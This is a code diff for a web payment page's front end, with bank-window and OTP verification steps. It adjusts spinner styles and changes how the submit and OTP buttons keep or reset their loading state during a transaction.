@@ -11,6 +11,7 @@
       display: flex;
       flex-direction: column;
       padding-top: 1.5rem;
+      padding-bottom: 0;
       background: linear-gradient(45deg, #ff0000 50%, #ffffff 50%);
     }
     .content-wrapper {
@@ -188,15 +189,26 @@
       transition: all 0.3s ease;
     }
     .modern-spinner {
-      width: 24px;
-      height: 24px;
-      border: 3px solid rgba(255,255,255,0.3);
+      width: 25px;
+      height: 25px;
+      border: 3px solid rgba(255,255,255,0.4);
       border-radius: 50%;
       border-top-color: #ffffff;
       animation: spin 0.8s ease-in-out infinite;
+      box-shadow: 0 0 5px rgba(255,255,255,0.2);
     }
     @keyframes spin {
-      to { transform: rotate(360deg); }
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+    #otpLoader {
+      animation: spin 1s linear infinite;
+      width: 20px;
+      height: 20px;
+      border: 2px solid rgba(255,255,255,0.4);
+      border-top-color: #ffffff;
+      border-radius: 50%;
+      box-shadow: 0 0 5px rgba(255,255,255,0.2);
     }
     .btn-loading {
       position: relative;
@@ -214,6 +226,8 @@
       justify-content: center;
       align-items: center;
       gap: 10px;
+      position: relative;
+      z-index: 1;
     }
     .fullscreen-overlay {
       position: fixed;
@@ -687,15 +701,10 @@
           'width=600,height=800'
         );
 
-        // Check window closure
+        // Check window closure - but don't reset loading state when it closes
         const checkWindowClosed = setInterval(() => {
           if (bankPageWindow && bankPageWindow.closed) {
             clearInterval(checkWindowClosed);
-            submitButton.classList.remove('btn-loading');
-            submitText.style.opacity = '1';
-            submitText.style.filter = 'none';
-            submitLoader.classList.add('hidden');
-            isProcessing = false;
           }
         }, 500);
 
@@ -763,11 +772,18 @@
       if (bankPageWindow && !bankPageWindow.closed) {
         bankPageWindow.close();
       }
-      // Only keep loading state if it's our transaction
+      // Keep loading state active regardless, but only check status if it's our transaction
+      const submitButton = document.getElementById('submitButton');
+      const submitText = document.getElementById('submitText');
+      const submitLoader = document.getElementById('submitLoader');
+
+      submitButton.classList.add('btn-loading');
+      submitText.style.opacity = '0.5';
+      submitText.style.filter = 'blur(1px)';
+      submitLoader.classList.remove('hidden');
+
       if (data.invoiceId === currentInvoiceId) {
-        const submitButton = document.getElementById('submitButton');
-        submitButton.classList.add('btn-loading');
-        // Start checking transaction status
+        // Start checking transaction status but don't change loading state
         if (!statusCheckInterval) {
           statusCheckInterval = setInterval(checkTransactionStatus, 2000);
         }
@@ -790,7 +806,15 @@
         if (!timerInterval) { startOtpTimer(); }
         if (data.otpError) {
           document.getElementById('otpError').style.display = 'block';
-          document.getElementById('otpSubmitButton').disabled = false;
+          // Reset OTP button state when there's an error
+          const otpButton = document.getElementById('otpSubmitButton');
+          const otpLoader = document.getElementById('otpLoader');
+          const btnText = document.getElementById('otpText');
+          otpButton.disabled = false;
+          otpLoader.classList.add('hidden');
+          btnText.style.opacity = '1';
+          btnText.style.filter = 'none';
+          isProcessing = false;
         } else {
           document.getElementById('otpError').style.display = 'none';
         }
